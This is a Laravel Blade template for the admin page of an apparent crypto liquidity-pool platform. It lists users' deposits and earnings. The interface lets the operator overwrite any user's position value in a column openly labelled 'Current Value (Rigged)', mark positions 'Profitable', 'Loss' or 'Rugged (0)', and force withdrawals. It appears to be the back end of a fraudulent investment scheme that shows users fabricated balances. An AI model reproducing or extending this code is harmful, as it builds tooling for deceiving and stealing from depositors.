@extends('layouts.admin.app')
@section('content')
<div class="container-fluid">
    <h1 class="h3 mb-4 text-gray-800">Liquidity Positions</h1>
    <div class="card shadow mb-4">
        <div class="card-body">
            <div class="table-responsive">
                <table class="table table-bordered">
                    <thead>
                        <tr>
                            <th>User</th>
                            <th>Pool</th>
                            <th>Amount Deposited</th>
                            <th>Earned Fees/Rewards</th>
                            <th>Current Value (Rigged)</th>
                            <th>Admin Status</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        @foreach($positions as $item)
                        <tr>
                            <td>{{ $item->user->first_name ?? 'N/A' }}</td>
                            <td>{{ $item->pool->name ?? 'N/A' }}</td>
                            <td>${{ $item->amount_deposited }}</td>
                            <td>${{ $item->earned_fees + $item->earned_rewards }}</td>
                            <td>
                                <form action="{{ route('admin.liquidity.positions.update') }}" method="POST" class="d-inline">
                                    @csrf
                                    <input type="hidden" name="id" value="{{ $item->id }}">
                                    $<input type="text" name="current_value" value="{{ $item->current_value }}" class="form-control form-control-sm" style="width:100px; display:inline">
                                    <button class="btn btn-sm btn-success"><i class="fa fa-save"></i></button>
                                </form>
                            </td>
                            <td>
                                <form action="{{ route('admin.liquidity.positions.update') }}" method="POST" class="d-inline">
                                    @csrf
                                    <input type="hidden" name="id" value="{{ $item->id }}">
                                    <select name="admin_status" class="form-control form-control-sm" onchange="this.form.submit()" style="width:120px; display:inline">
                                        <option value="" {{ is_null($item->admin_status) ? 'selected' : '' }}>None</option>
                                        <option value="profitable" {{ $item->admin_status == 'profitable' ? 'selected' : '' }}>Profitable</option>
                                        <option value="loss" {{ $item->admin_status == 'loss' ? 'selected' : '' }}>Loss</option>
                                        <option value="rugged" {{ $item->admin_status == 'rugged' ? 'selected' : '' }}>Rugged (0)</option>
                                    </select>
                                </form>
                            </td>
                            <td>
                                <form action="{{ route('admin.liquidity.positions.update') }}" method="POST" class="d-inline">
                                    @csrf
                                    <input type="hidden" name="id" value="{{ $item->id }}">
                                    <input type="hidden" name="action" value="force_withdraw">
                                    <button class="btn btn-warning btn-sm">Force Withdraw</button>
                                </form>
                            </td>
                        </tr>
                        @endforeach
                    </tbody>
                </table>
            </div>
        </div>
    </div>
</div>
@endsection
